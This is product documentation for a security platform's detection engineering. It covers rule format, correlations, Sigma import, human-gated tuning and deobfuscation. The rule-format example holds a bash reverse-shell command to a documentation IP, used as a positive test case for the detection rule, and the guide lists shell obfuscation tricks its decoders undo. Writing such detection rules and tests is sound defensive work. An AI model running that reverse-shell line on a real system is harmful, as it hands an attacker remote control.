# Detection engineering guide

ThreatBrain detects with **deterministic content first** (rules and correlations that run without an LLM) and uses agents to triage, enrich and respond.
This page documents the content model, how to extend it, and what the coverage numbers do and do not mean.

## 1. Pipeline

```
event -> normalise (adapter + canonical raw keys) -> store (idempotent) -> queue -> worker:
   1. rules (built-in + tenant overrides + tenant custom)   -> persist this event's detections
   2. correlations over the entity's recent events           -> exactly-once via a ledger
   3. if anything fired and INGEST_TRIAGE_MODE allows it     -> agent pipeline (triage, intel, investigation, response, ...)
```

Normalisation: adapters for Wazuh, Elastic ECS, CEF, CloudTrail, Splunk and generic JSON map vendor fields to the event schema, and
`app/ingest/normalize.py` adds canonical keys under `raw_data` (`parent_process`, `process_path`, `file_path`, `event_code`, `query`, `user_agent`, `url`,
`bytes_out`, ...) so rules do not care which vendor sent the event. Full image paths are reduced to the executable name for `process_name` rules (the path stays in `raw.process_path`).
The CloudTrail adapter drops routine read-only calls but keeps Root-user calls, denied calls and credential/secret reads.

## 2. Rule format

```yaml
- id: TB-EXEC-003
  name: Reverse shell command
  severity: critical           # info | low | medium | high | critical
  confidence: 90               # 0-100: how likely a match is a true positive (used for the severity floor)
  techniques: [T1059.004, T1095]   # validated against the ATT&CK catalog; tactics are derived
  tags: [reverse-shell]
  tuning: what to change if this is noisy in your environment
  match:
    any:
      - {field: command_line, regex: '/dev/(tcp|udp)/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+'}
  tests:                        # REQUIRED: at least one positive and one negative; CI runs them
    - {event: {command_line: "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"}, expect_match: true}
    - {event: {command_line: "nc -zv 10.0.0.5 22"}, expect_match: false}
```

* Tree: `all` / `any` / `not` over leaves `{field, <operator>: value}`. Operators: `equals, contains, startswith, endswith, regex, in, cidr, gt, gte, lt, lte, exists`.
  Matching is case-insensitive. `field` is a normalised attribute (`title`, `event_type`, `source_ip`, `destination_ip`, `destination_port`, `username`, `process_name`, `command_line`, `asset_name`, `outcome`),
  `raw.<dotted.path>` into the vendor payload (keys match case-insensitively), or `text` (every string in the event joined, bounded).
* `command_line` is evaluated as written **and** with quotes, `cmd.exe ^` escapes and repeated whitespace removed, which defeats the cheapest shell-level obfuscation.
* Regexes must use bounded gaps (`.{0,200}`); unbounded wildcards and nested quantifiers are rejected when the rule loads.
* The built-in set is `backend/app/detection/rules.yaml` (126 rules at the time of writing, version in the file header); it is CI-checked for unique ids, valid ATT&CK ids, tests, and a differential test proves the compiled fast path equals the reference interpreter on the whole validation corpus.

## 3. Correlations (`correlations.yaml`)

Kinds: **sequence** (stages in time order for one entity, e.g. credential theft then lateral movement by the same account), **threshold** (>= N distinct rules/tactics for one entity), **rate** (>= N matching events, or N distinct values of a field,
inside a window - this works on raw events that never alerted, e.g. 10 failed logins in 10 minutes or password spraying across 6 accounts). Entities: `source_ip`, `username`, `asset_name`, `destination_ip`.

Events are processed concurrently by independent workers, so correlation is **order-independent by construction**: each processor persists its own detections first, then evaluates the whole entity group symmetrically, and a ledger
(`correlation_hits`, one row per completion) lets exactly one processor report it. Tested by reversing processing order and by forcing two threads into the race window. A threshold counts one tactic per detection (its primary tactic), so a
single multi-tactic technique cannot masquerade as several attack phases.

## 4. Tenant content: custom rules, Sigma, overrides

* `GET /rules` lists built-in rules (with this tenant's overrides) and custom rules; admins can **disable a built-in rule (reason required, audited)** or **change its severity** for the tenant only.
* Custom rules start as **drafts** and cannot be enabled until they have at least one positive and one negative test and every test passes. Edits create a new version (and return an enabled rule to draft); any version can be restored.
  A custom rule cannot reuse a built-in id. Validate and dry-run endpoints never persist.
* **Sigma import** (`/rules/sigma/convert|import`): selections as maps / lists / keywords, modifiers `contains, startswith, endswith, re, all, cidr, gt/gte/lt/lte`, wildcards, and `and/or/not/()/1 of/all of` conditions.
  Aggregations (`count`, `near`, `timeframe`) and transforming modifiers (`base64offset`, `windash`, ...) are **rejected with an explanation, never approximated**. `logsource` is not enforced (a warning says so). Imported rules are drafts with no tests until you add them.
* **Coverage** (`/rules/coverage`, Detection -> Coverage): per ATT&CK tactic, how many catalogued techniques have an *enabled* rule for your tenant, and which do not. The catalogue is a curated subset of ATT&CK (167 technique and sub-technique ids), not the full framework, and "has a rule" is not "is reliably detected" -
  see [VALIDATION.md](VALIDATION.md) for measured detection rates.

## 5. Tuning with feedback (Detection Engineering agent)

Analysts mark threats `false_positive` or resolve them. After >= 3 false positives from one rule, `POST /rules/{rule}/tuning-proposal` gives the agent the rule, the statistics and up to 10 false- and 10 true-positive events. It proposes a new match tree and tests, and **the server verifies it**:
it must be a valid rule, pass its own positive/negative tests, match fewer of the false-positive samples than the original, and lose none of the true-positive samples. Only then is it stored - as a *draft* custom rule that a human must test-run and enable.
A `disable` recommendation changes nothing. The agent never edits live content.

## 6. Health of the content

`tb_detection_hits_total{rule,kind}` shows which rules are noisy and which never fire; the validation corpus shows which techniques are not caught; known evasion gaps are listed openly in the validation report.
Add a scenario with every rule you add or change (see [VALIDATION.md](VALIDATION.md)).

## 7. Normalisation before matching (`app/detection/deobfuscate.py`)

Rules describe the *meaning* of a command or request; attackers control its *spelling*. Text fields are therefore also evaluated in decoded "alternate" forms, computed once per event and cached on the event view:
shell quoting/caret/`${IFS}`/ANSI-C/backslash splicing, PowerShell concatenation, `-f` formats, `[char]` chains and backticks, `.exe` suffixes, nested URL encoding (3 layers) with overlong UTF-8 / Unicode look-alikes,
log4j-style `${lower:j}` lookups, SQL inline comments, `\x`/`\u`/octal escapes and printable base64 payloads (UTF-8 and UTF-16LE). The original text is always evaluated first; a decoded form is only an additional view.
Each decoder runs only when a cheap marker is present and is length-bounded; nothing is executed. Rules need no change to benefit, and a rule that must see the exact spelling can still opt out of alternates.
Identity values (user, host) are canonicalised at ingest (case, domain/UPN forms); the original is kept in `raw_data._username_as_sent` / `_asset_name_as_sent`.

## 8. Alerts, signals and behaviour

* A rule marked `signal: true` records a low-confidence behaviour (e.g. a single discovery command). Signals are stored and usable by correlations (selectors accept `rules`, `tactics` or `tags`) but **never open a threat on their own**. Evaluation reports "detected" (any hit) and "alerted" (non-signal hit) separately.
* Inside a rule family the primary tactic is chosen deterministically so ATT&CK mapping does not depend on rule order.
* Behavioural anomalies (`TB-UEBA-001..008`) are produced by `app/behavior` and merged with rule hits before the pipeline; see [BEHAVIORAL_ANALYTICS.md](BEHAVIORAL_ANALYTICS.md).
* What is measured and what is not: [VALIDATION.md](VALIDATION.md) section 0 and [reports/detection-gap-remediation.md](reports/detection-gap-remediation.md). ATT&CK coverage matrix: [reports/attack-coverage.md](reports/attack-coverage.md) (83 of 228 parent techniques have a rule; the catalogue is the full Enterprise matrix).
